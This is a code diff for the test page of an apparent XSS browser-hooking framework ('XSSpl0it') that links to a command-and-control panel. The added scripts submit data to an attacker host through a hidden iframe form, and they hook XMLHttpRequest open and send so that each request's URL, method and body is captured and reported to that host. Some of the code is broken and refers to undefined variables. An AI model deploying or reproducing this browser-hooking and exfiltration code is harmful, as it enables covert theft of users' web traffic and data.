@@ -4,7 +4,87 @@
 <h1>XSSpl0it Test Page</h1>
 <p>Nothing fancy, your browser is now hooked.
 <a href="/panel.html">Command and Control</a>
+<a href="http://yahoo.com">yahoo</a>
 </p>
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
 <script src="http://localhost/h.php"></script>
+
+<script>
+	//var a = "foo {0} is = {1}".format("thing", "something else");
+	//alert(a);
+
+	var ifr = document.createElement('iframe');
+	var frm = document.createElement('form');
+	ifr.setAttribute("name", "cspost");
+	ifr.setAttribute("style", "display:none;width:0;height:0;");
+	frm.setAttribute("action", "http://"+sploit+"/debugvars.php");
+	frm.setAttribute("method", "post");
+	frm.setAttribute("target", "cspost");
+
+	var e = document.createElement('input');
+	e.setAttribute("type", "hidden");
+	e.setAttribute("name","cross-origin");
+	e.setAttribute("value", "THE DATA");
+	e.setAttribute("id", "inputid");
+	frm.appendChild(e);
+
+
+	// create hidden inputs, add them
+	// not shown, but similar (create, setAttribute, appendChild)
+
+	ifr.appendChild(frm);
+	document.body.appendChild(ifr);
+	var q = document.getElementById("inputid");
+	console.log(q);
+	frm.submit();
+</script>
+
+<script>
+	function reqListener () {
+		  console.log(this.responseText);
+	  }
+	var xssend = XMLHttpRequest.prototype.send;
+	var xssopen = XMLHttpRequest.prototype.open;
+	//console.log("global:");
+	//console.log(xssend);
+	var xssxhr = {};
+	XMLHttpRequest.prototype.open = function(method, url, data) {
+		/*	
+		console.log("BEGIN custom open:");
+		console.log(method);
+		console.log(data1);
+		console.log(data2);
+		console.log(data3);
+		console.log(this);
+		console.log("END custom open.");
+		*/
+		xssxhr.method=method;
+		xssxhr.url=url;
+		this.origopen(method, url, data);
+	}
+	XMLHttpRequest.prototype.send = function(d1, d2, d3) {
+		//console.log("BEGIN custom send: ");
+		console.log(p1);
+		xssxhr.data=d1;
+		xssxhr.data2=d2;
+		cs(sploitapi+"?xhr=1");
+		this.origsend(p1, p2, p3);
+		//console.log("END custom send.");
+	}
+
+	XMLHttpRequest.prototype.origsend = xssend;
+	XMLHttpRequest.prototype.origopen = xssopen;
+
+	/*
+	var oReq = new XMLHttpRequest();
+	oReq.onload = reqListener;
+	oReq.open("get", "http://www.mydomain.com", true);
+	oReq.send();
+	*/
+//	$.post("/foobar.php", {post1: "value1"}, function(data) { alert("POSTED DATA!"); });
+//	$.get("/foobar.php", {param1: "get1"}, function(data) { alert("GET DATA!"); } );
+
+</script>
 </body>
 </html>
